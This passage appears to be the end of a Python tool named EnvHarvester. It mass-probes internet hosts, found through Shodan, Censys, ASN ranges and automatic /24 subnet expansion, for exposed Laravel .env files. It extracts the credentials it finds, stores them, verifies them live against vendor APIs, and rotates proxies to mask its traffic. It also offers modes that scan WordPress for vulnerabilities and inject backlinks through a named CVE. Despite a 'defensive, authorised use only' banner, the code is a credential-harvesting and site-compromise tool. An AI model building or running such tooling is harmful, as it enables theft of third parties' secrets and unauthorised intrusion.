    if enable_subnet_expand and hit_ips:
        # Build the set of IPs already covered by the main scan so we don't
        # duplicate work. new_targets already excludes previously probed hosts.
        main_scan_set: set[str] = {t.split(":")[0] for t in new_targets if _is_ip(t.split(":")[0])}

        neighbor_candidates: set[str] = set()
        hit_nets: set[str] = set()
        for ip in hit_ips:
            try:
                net = ipaddress.ip_network(f"{ip}/24", strict=False)
                hit_nets.add(str(net))
                for h in net.hosts():
                    candidate = str(h)
                    if candidate not in main_scan_set:
                        neighbor_candidates.add(candidate)
            except ValueError:
                continue

        # Remove hosts already recorded in the probed_hosts checkpoint DB.
        already_probed: set[str] = {
            r[0] for r in conn.execute("SELECT host FROM probed_hosts").fetchall()
        }
        neighbors = [h for h in neighbor_candidates
                     if _normalize_host(h) not in already_probed]

        if not neighbors:
            print(
                f"[subnet] {len(hit_ips)} hit IP(s) in {len(hit_nets)} /24(s) — "
                "all neighbors already covered by main scan.",
                flush=True,
            )
        else:
            print(
                f"\n[subnet] {len(hit_ips)} hit IP(s) across {len(hit_nets)} /24 subnet(s) → "
                f"deep-scanning {len(neighbors)} unprobed neighbor(s) with all {len(active_paths)} paths",
                flush=True,
            )
            subnet_probed: list[tuple[str, str]] = []

            async for probe_url, text in run_laravel_env_probe(
                neighbors, active_paths, concurrency, proxy_mgr=proxy_mgr,
            ):
                creds = extract_laravel_creds(text)
                is_template = _is_template_path(probe_url)
                if is_template and not any(creds.get(v) for v in _VENDOR_ORDER):
                    print(f"[subnet] (template) {probe_url}", flush=True)
                    continue

                subnet_hits += 1
                label = "Laravel .env" if creds["is_laravel"] else ".env"
                print(f"\n[subnet] *** {label} EXPOSED: {probe_url} ***", flush=True)

                s_host = probe_url.split("://", 1)[1].split("/")[0]
                s_domain = extract_domain(text) or (s_host if not _is_ip(s_host.split(":")[0]) else None)

                for vendor in _VENDOR_ORDER:
                    for key in creds.get(vendor, []):
                        is_new = save_finding(
                            conn,
                            source="laravel/subnet-expand",
                            url=probe_url,
                            resend_key=key,
                            linked_domain=s_domain,
                            file_path=probe_url,
                            raw_context=text[:2000],
                            vendor=vendor,
                        )
                        tag = "NEW" if is_new else "dup"
                        print(f"[subnet]   [{vendor}/{tag}] {_redact(key)}", flush=True)
                        if is_new:
                            counters["found"] += 1

                if creds["smtp_vars"] and not creds["smtp"]:
                    print(
                        f"[subnet]   ⚠ SMTP vars present (password placeholder/empty): "
                        f"{', '.join(sorted(creds['smtp_vars']))}",
                        flush=True,
                    )

                subnet_probed.append((_normalize_host(s_host), datetime.now(timezone.utc).isoformat()))

            if subnet_probed:
                conn.executemany(
                    "INSERT OR REPLACE INTO probed_hosts (host, probed_at) VALUES (?, ?)",
                    subnet_probed,
                )
                conn.commit()

            if subnet_hits:
                print(f"\n[subnet] Deep-scan complete — {subnet_hits} additional hit(s) found.", flush=True)
            else:
                print(f"[subnet] Deep-scan complete — no additional hits in {len(hit_nets)} /24 subnet(s).", flush=True)

    # 12. Live key verification against vendor APIs — covers any unverified
    # rows from prior runs as well as new ones.
    if enable_verify:
        await verify_findings_live(conn, proxy_mgr=proxy_mgr)

    template_note = f", {template_hits} template file(s) skipped" if template_hits else ""
    subnet_note = f", {subnet_hits} from subnet expand" if subnet_hits else ""
    print(
        f"\n[laravel] Probe complete — {hits} exposed file(s) found{subnet_note}, "
        f"{counters['found']} credential(s) saved{template_note}.",
        flush=True,
    )
    if remaining_after_cap:
        print(
            f"[laravel] {remaining_after_cap:,} host(s) not yet scanned — "
            "re-run to continue (already-probed hosts are skipped automatically).",
            flush=True,
        )


# ── CLI ────────────────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="harvester",
        description="EnvHarvester – Defensive .env probe (authorised use only)",
    )
    p.add_argument(
        "--laravel-targets-file",
        default=None,
        metavar="FILE",
        help="File of newline-separated domains/IPs to probe.",
    )
    p.add_argument(
        "--concurrency",
        type=int,
        default=50,
        metavar="N",
        help="Concurrent probes (default: 50)",
    )
    p.add_argument(
        "--db",
        default=str(DB_PATH),
        metavar="PATH",
        help=f"SQLite database path (default: {DB_PATH})",
    )
    p.add_argument(
        "--proxy",
        default=os.getenv("HARVESTER_PROXY"),
        metavar="URL_OR_LIST",
        help=(
            "Proxy URL(s) for all outbound traffic. Accepts a single URL or a "
            "newline/comma separated list for round-robin rotation. Schemes: "
            "http://, https://, socks4://, socks5://, socks5h:// "
            "(socks5h routes DNS through proxy — recommended). "
            "Falls back to HARVESTER_PROXY env var — preferred over CLI to "
            "keep credentials out of the process command line."
        ),
    )
    p.add_argument(
        "--proxy-rotation",
        default="round-robin",
        choices=("round-robin", "random"),
        help="Pool selection strategy when multiple proxies are configured.",
    )
    p.add_argument(
        "--proxy-retries",
        type=int,
        default=2,
        metavar="N",
        help="Per-request retries via next pool member on proxy failure (default 2).",
    )
    p.add_argument(
        "--skip-proxy-health-check",
        action="store_true",
        help="Skip the up-front proxy probe. Dead proxies are still pruned on first use.",
    )
    p.add_argument(
        "--shodan-key",
        default=os.getenv("SHODAN_API_KEY"),
        metavar="KEY",
        help="Shodan API key for automatic target discovery. Overrides SHODAN_API_KEY env var.",
    )
    p.add_argument(
        "--censys-id",
        default=os.getenv("CENSYS_API_ID"),
        metavar="ID",
        help="Censys API ID. Pair with --censys-secret. Overrides CENSYS_API_ID env var.",
    )
    p.add_argument(
        "--censys-secret",
        default=os.getenv("CENSYS_API_SECRET"),
        metavar="SECRET",
        help="Censys API secret. Overrides CENSYS_API_SECRET env var.",
    )
    p.add_argument(
        "--netlas-key",
        default=os.getenv("NETLAS_API_KEY"),
        metavar="KEY",
        help="Netlas.io API key for target discovery. Overrides NETLAS_API_KEY env var.",
    )
    p.add_argument(
        "--urlscan-key",
        default=os.getenv("URLSCAN_API_KEY"),
        metavar="KEY",
        help="URLScan.io API key (optional — discovery works without one, key raises rate limits).",
    )
    p.add_argument(
        "--enable-urlscan",
        action="store_true",
        help="(WordPress mode only) Query URLScan.io for WordPress sites. Free, no key required.",
    )
    p.add_argument(
        "--enable-wayback",
        action="store_true",
        help="(WordPress mode only) Query RapidDNS to convert input IP ranges into "
             "domain names hosted on those IPs. Critical for shared hosting where WP "
             "sites only respond to the correct Host header. Free, no auth.",
    )
    p.add_argument(
        "--enable-commoncrawl",
        action="store_true",
        help="(WordPress mode only) Query CommonCrawl CDX index for domains that hosted "
             "vulnerable WP plugins. Free, no auth.",
    )
    p.add_argument(
        "--enable-fofa",
        action="store_true",
        help="(WordPress mode only) Reserved for future use.",
    )
    p.add_argument(
        "--enable-crtsh",
        action="store_true",
        help="Enumerate subdomains of input domains via crt.sh CT logs.",
    )
    p.add_argument(
        "--enable-reverse-dns",
        action="store_true",
        help="Resolve PTR records for IPs and probe by hostname when available.",
    )
    p.add_argument(
        "--enable-verify",
        action="store_true",
        help="Verify discovered keys live against vendor APIs (read-only).",
    )
    p.add_argument(
        "--fast-paths",
        dest="fast_paths",
        action="store_const",
        const=True,
        default=None,
        help=(
            f"Force fast-paths mode: probe only the {len(_ESSENTIAL_PATHS)} highest-yield paths "
            f"({', '.join(_ESSENTIAL_PATHS)}). "
            f"Auto-enabled (without this flag) when new targets exceed {_FAST_PATHS_THRESHOLD:,}."
        ),
    )
    p.add_argument(
        "--no-fast-paths",
        dest="fast_paths",
        action="store_const",
        const=False,
        help="Force all configured paths even when target count exceeds the auto-enable threshold.",
    )
    p.add_argument(
        "--max-hosts-per-run",
        type=int,
        default=_DEFAULT_MAX_HOSTS_PER_RUN,
        metavar="N",
        help=(
            f"Probe at most N new hosts per run (default: {_DEFAULT_MAX_HOSTS_PER_RUN:,}). "
            "Re-run to continue — already-probed hosts are skipped automatically. "
            "Set to 0 to disable the cap."
        ),
    )
    p.add_argument(
        "--auto-expand-subnet",
        action="store_true",
        help=(
            "Automatically widen bare IPv4 addresses to their /24 subnet. "
            "e.g. 10.0.0.5 → probes all 254 hosts in 10.0.0.0/24. "
            "Explicit CIDRs and IPv6 are never auto-expanded."
        ),
    )
    p.add_argument(
        "--asn",
        action="append",
        default=[],
        metavar="AS12345",
        help=(
            "Autonomous System Number to resolve to IPv4 prefixes and probe. "
            "Can be repeated: --asn AS14061 --asn 15169. "
            "Prefixes are appended to the target list before CIDR expansion."
        ),
    )
    p.add_argument(
        "--ipinfo-token",
        default=os.getenv("IPINFO_TOKEN"),
        metavar="TOKEN",
        help=(
            "IPinfo.io API token for ASN→prefix lookup (most accurate, updated daily). "
            "Falls back to BGPView then RIPEstat when omitted. "
            "Set IPINFO_TOKEN env var to keep the token out of the process command line."
        ),
    )
    p.add_argument(
        "--no-tcp-prefilter",
        dest="tcp_prefilter",
        action="store_false",
        default=True,
        help=(
            "Disable TCP port-scan pre-filter. By default, when >25%% of targets are "
            "raw IPs, a fast async TCP scan on ports 80/443 runs first (1 s timeout, "
            "500 concurrent) to eliminate dark addresses before queuing HTTP probes. "
            "Disable if you want to probe IPs regardless of port state."
        ),
    )
    p.add_argument(
        "--no-subnet-expand",
        dest="subnet_expand",
        action="store_false",
        default=True,
        help=(
            "Disable automatic /24 subnet expansion. By default, when a hit is found "
            "on an IP, all unprobed neighbors in the same /24 are deep-scanned with "
            "all paths (TCP prefilter bypassed — a hit in the subnet justifies it). "
            "Disable for targeted single-host scans where neighbors are out of scope."
        ),
    )
    p.add_argument(
        "--show-db",
        action="store_true",
        help="Print findings table and exit",
    )
    p.add_argument("--mode", default="laravel", help=argparse.SUPPRESS)
    p.add_argument(
        "--scan-mode", choices=["laravel", "cpanel", "github", "wordpress", "backlink", "cleanup_backlinks"], default="laravel",
        help="Scan mode: 'laravel' probes .env files, 'cpanel' finds cPanel panels, 'github' searches GitHub, 'wordpress' scans for WP vulnerabilities, 'backlink' injects backlinks via CVE-2026-41940",
    )
    p.add_argument(
        "--github-token",
        default=os.getenv("GITHUB_TOKEN", ""),
        help="GitHub personal access token for code search (env: GITHUB_TOKEN)",
    )
    p.add_argument("--monitor-minutes", type=int, default=60, help=argparse.SUPPRESS)
    return p.parse_args()


async def main() -> None:
    args = parse_args()
    db_path = Path(args.db)
    conn = init_db(db_path)

    # Graceful SIGTERM handling: when the API server (or any supervisor) sends
    # SIGTERM, default behaviour is immediate exit with no cleanup — meaning
    # the in-memory probed_hosts batch never reaches the DB and the next run
    # re-probes already-scanned hosts. Convert SIGTERM to task cancellation
    # so the try/finally in _laravel_pipeline runs and flushes the batch.
    loop = asyncio.get_running_loop()
    main_task = asyncio.current_task()

    def _on_signal(sig: int) -> None:
        print(f"\n[harvester] Received signal {sig} — flushing checkpoint and exiting cleanly", flush=True)
        if main_task is not None and not main_task.done():
            main_task.cancel()

    for s in (signal.SIGTERM, signal.SIGINT):
        try:
            loop.add_signal_handler(s, _on_signal, s)
        except NotImplementedError:
            # Windows doesn't support add_signal_handler — fall back to default.
            pass

    try:
        await _main(args, conn)
        print("[harvester] _main returned normally — scan complete or no targets.", flush=True)
    except asyncio.CancelledError:
        # Re-raised after finally blocks ran (incl. checkpoint flush). Exit cleanly.
        print("[harvester] Cancelled — checkpoint saved.", flush=True)
    except Exception as e:
        # Any unhandled exception that reaches here means the scan died for an
        # unexpected reason. Log loudly with traceback so the cause is visible
        # in the UI log stream rather than silently exiting.
        import traceback
        print(f"[harvester] FATAL UNHANDLED EXCEPTION: {type(e).__name__}: {e}", flush=True)
        print(traceback.format_exc(), flush=True)
        raise
    finally:
        conn.close()


async def _main(args: argparse.Namespace, conn: sqlite3.Connection) -> None:
    if args.show_db:
        rows = conn.execute(
            "SELECT source, resend_key, linked_domain, url, detected_at "
            "FROM findings ORDER BY detected_at DESC LIMIT 30"
        ).fetchall()
        for r in rows:
            print(f"[{r['source']:<20}] {r['resend_key']}  "
                  f"{r['linked_domain'] or '—':<25}  {r['url'] or '—'}")
        return

    # GitHub scan is standalone — no targets needed
    if getattr(args, "scan_mode", "laravel") == "github":
        token = getattr(args, "github_token", "") or os.getenv("GITHUB_TOKEN", "")
        if not token:
            print("[github] No GitHub token — set GITHUB_TOKEN or pass --github-token", flush=True)
            return
        print("=" * 60, flush=True)
        print("EnvHarvester – GitHub Secret Scanner", flush=True)
        print("Authorised infrastructure testing only.", flush=True)
        print("=" * 60, flush=True)
        proxy_urls = parse_proxy_list(getattr(args, "proxy", "") or "")
        proxy_mgr = ProxyManager(proxy_urls)
        try:
            await run_github_scan(token, conn, proxy_mgr=proxy_mgr)
        finally:
            await proxy_mgr.close()
        return

    cfg = load_config()
    laravel_env_paths = cfg.get("laravel_env_paths", [])

    if getattr(args, "laravel_targets_file", None):
        try:
            raw_targets = [
                line.strip()
                for line in Path(args.laravel_targets_file).read_text().splitlines()
                if line.strip() and not line.strip().startswith("#")
            ]
        except Exception as e:
            print(f"[harvester] Could not read targets file: {e}", flush=True)
            raw_targets = []
    else:
        raw_targets = cfg.get("laravel_targets", [])

    laravel_targets = raw_targets

    asns = [a.strip() for a in (args.asn or []) if a.strip() and not a.strip().startswith("#")]
    enable_urlscan = getattr(args, "enable_urlscan", False)
    enable_wayback = getattr(args, "enable_wayback", False)
    enable_commoncrawl = getattr(args, "enable_commoncrawl", False)
    enable_fofa = getattr(args, "enable_fofa", False)
    mode_tag = getattr(args, "scan_mode", "laravel")
    free_discovery = enable_urlscan or enable_wayback or enable_commoncrawl or enable_fofa
    if not raw_targets and not asns and not (mode_tag == "wordpress" and free_discovery):
        print(f"[{mode_tag}] No targets provided — add via UI textarea, load a file, supply --asn, or enable URLScan discovery.", flush=True)
        return

    counters = {"scanned": 0, "found": 0}
    print("=" * 60, flush=True)
    print("EnvHarvester – Defensive .env Probe", flush=True)
    print("Authorised infrastructure testing only.", flush=True)
    print("=" * 60, flush=True)

    # Build proxy manager (handles 0, 1, or many proxies; HTTP/HTTPS/SOCKS).
    proxy_urls = parse_proxy_list(args.proxy or "")
    proxy_mgr = ProxyManager(
        proxy_urls,
        retries=args.proxy_retries,
        rotation=args.proxy_rotation,
        connection_limit=min(400, max(50, args.concurrency * 3)),
    )
    if proxy_urls:
        print(
            f"[proxy] {len(proxy_urls)} proxy/proxies configured "
            f"(rotation={args.proxy_rotation}, retries={args.proxy_retries})",
            flush=True,
        )
        if not args.skip_proxy_health_check:
            print("[proxy] Running health check …", flush=True)
            results = await proxy_mgr.health_check()
            for url, info in results.items():
                tag = url.split("@")[-1]
                if info.get("ok"):
                    print(f"[proxy]   ✓ {tag}  egress={info.get('ip', '?')}", flush=True)
                else:
                    raw_err = (
                        info.get("error")
                        or (f"HTTP {info['status']}" if info.get("status") else "connection failed")
                    )
                    print(f"[proxy]   ✗ {tag}  {scrub_credentials(raw_err)}", flush=True)
            if proxy_mgr.alive_count == 0:
                print(
                    "[proxy] All proxies failed health check. Aborting — fix the "
                    "pool or pass --skip-proxy-health-check to bypass.",
                    flush=True,
                )
                await proxy_mgr.close()
                return
            print(
                f"[proxy] {proxy_mgr.alive_count}/{proxy_mgr.total} proxies live",
                flush=True,
            )

    try:
        if getattr(args, "scan_mode", "laravel") == "cpanel":
            if not laravel_env_paths:
                pass  # cpanel mode doesn't need env paths
            await _cpanel_pipeline(
                laravel_targets, conn, counters,
                args.concurrency,
                proxy_mgr=proxy_mgr,
                shodan_key=args.shodan_key,
                censys_id=args.censys_id,
                censys_secret=args.censys_secret,
                netlas_key=args.netlas_key,
                enable_crtsh=args.enable_crtsh,
                asns=asns,
                ipinfo_token=args.ipinfo_token,
                max_hosts_per_run=args.max_hosts_per_run,
            )
        elif getattr(args, "scan_mode", "laravel") == "cleanup_backlinks":
            await _backlink_cleanup_pipeline(conn, proxy_mgr=proxy_mgr)
            return
        elif getattr(args, "scan_mode", "laravel") == "backlink":
            await _backlink_pipeline(
                laravel_targets, conn, counters,
                args.concurrency,
                proxy_mgr=proxy_mgr,
                shodan_key=args.shodan_key,
                censys_id=args.censys_id,
                censys_secret=args.censys_secret,
                netlas_key=args.netlas_key,
                enable_crtsh=args.enable_crtsh,
                asns=asns,
                ipinfo_token=args.ipinfo_token,
                max_hosts_per_run=args.max_hosts_per_run,
            )
        elif getattr(args, "scan_mode", "laravel") == "wordpress":
            await _wordpress_pipeline(
                laravel_targets, conn, counters,
                args.concurrency,
                proxy_mgr=proxy_mgr,
                shodan_key=args.shodan_key,
                censys_id=args.censys_id,
                censys_secret=args.censys_secret,
                netlas_key=args.netlas_key,
                urlscan_key=getattr(args, "urlscan_key", None),
                enable_urlscan=getattr(args, "enable_urlscan", False),
                enable_crtsh=args.enable_crtsh,
                enable_wayback=enable_wayback,
                enable_commoncrawl=enable_commoncrawl,
                enable_fofa=enable_fofa,
                asns=asns,
                ipinfo_token=args.ipinfo_token,
                max_hosts_per_run=args.max_hosts_per_run,
                enable_tcp_prefilter=args.tcp_prefilter,
            )
        else:
            if not laravel_env_paths:
                print("[laravel] No laravel_env_paths in config.yaml.", flush=True)
                return
            await _laravel_pipeline(
                laravel_targets, laravel_env_paths, conn, counters,
                args.concurrency,
                proxy_mgr=proxy_mgr,
                shodan_key=args.shodan_key,
                censys_id=args.censys_id,
                censys_secret=args.censys_secret,
                netlas_key=args.netlas_key,
                enable_crtsh=args.enable_crtsh,
                enable_reverse_dns=args.enable_reverse_dns,
                enable_verify=args.enable_verify,
                auto_expand_ips=args.auto_expand_subnet,
                asns=asns,
                ipinfo_token=args.ipinfo_token,
                fast_paths=args.fast_paths,
                max_hosts_per_run=args.max_hosts_per_run,
                enable_tcp_prefilter=args.tcp_prefilter,
                enable_subnet_expand=args.subnet_expand,
            )
    finally:
        await proxy_mgr.close()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nInterrupted.", flush=True)
        sys.exit(0)
